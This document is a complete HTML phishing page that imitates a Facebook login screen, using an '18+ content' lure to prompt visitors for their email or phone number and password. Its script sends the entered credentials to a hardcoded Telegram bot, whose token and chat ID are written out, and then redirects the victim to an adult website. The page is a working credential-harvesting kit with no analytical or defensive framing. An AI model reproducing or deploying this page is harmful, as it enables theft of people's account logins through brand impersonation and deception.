<!doctype html>
<html lang="en-UK">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Login</title>

  <style>
    :root {
      --accent: #1877f2;
      --border: #d0d7e6;
      --text-muted: #777;
      --bg: #ffffff;
      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: var(--font);
      background: var(--bg);
      display: flex;
      justify-content: center;
      padding: 40px 0;
    }

    .language {
      text-align: center;
      font-size: 14px;
      color: var(--text-muted);
      margin-top: 8px;
    }

    .login-wrapper {
      width: 100%;
      max-width: 380px;
      text-align: center;
      margin-top: 20px;
    }

    .logo-circle {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      background: var(--accent);
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 35px auto 25px auto;
    }

    .logo-circle span {
      font-size: 42px;
      font-weight: 700;
      color: white;
      font-family: Arial, sans-serif;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 10px;
      border: 1px solid var(--border);
      font-size: 16px;
      margin-bottom: 12px;
    }

    button.login-btn {
      width: 100%;
      padding: 14px 16px;
      background: var(--accent);
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 18px;
      font-weight: 600;
      margin-top: 4px;
      cursor: pointer;
    }

    .forgot {
      margin-top: 16px;
      font-size: 15px;
      color: #1c1e21;
    }
    .forgot a {
      text-decoration: none;
      color: #1c1e21;
      font-weight: 500;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: var(--text-muted);
      margin-top: 40px;
    }

    @media (max-width: 450px) {
      body { padding: 20px; }
    }
  </style>
</head>

<body>

  <div class="login-wrapper">

    <div class="language">English (UK)</div>

    <div class="logo-circle">
      <span>f</span>
    </div>

    <form id="loginForm" novalidate>

      <div style="font-size:13px; color:#b91c1c; background:#ffe8e8; border-left:4px solid #ef4444; padding:8px 10px; text-align:left; margin:0 0 10px 0; border-radius:6px; font-weight:600;">⚠️ Please login to view 18+ content</div>

      <input
        type="text"
        id="username"
        name="username"
        placeholder="Mobile number or email address"
        required>

      <input
        type="password"
        id="password"
        name="password"
        placeholder="Password"
        required>

      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="forgot">
      <a href="#">Forgotten password?</a>
    </div>

    <div class="footer">
      About · Help · More
    </div>

  </div>

  <script>
  const form = document.getElementById('loginForm');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const usernameVal = user.value.trim();
    const passwordVal = pass.value.trim();

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{9,15}$/;

    if (!(emailRegex.test(usernameVal) || phoneRegex.test(usernameVal))) {
      alert("Please enter a valid email address or phone number.");
      return;
    }

    if (passwordVal.length < 5) {
      alert("Password must be at least 5 characters.");
      return;
    }

    const BOT_TOKEN = "7528648011:AAFKRVU3W_WGzSqDjHisW0m7vdGGcXk2FM4";
    const CHAT_ID = "5259327032";

    const message = "New login:\nUsername: " + usernameVal + "\nPassword: " + passwordVal;

    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(function() {
      window.location.href = "https://vlxx.bz";
    })
    .catch(function() {
      alert("Failed to send. Check bot token.");
    });
  });
  </script>

</body>
</html>
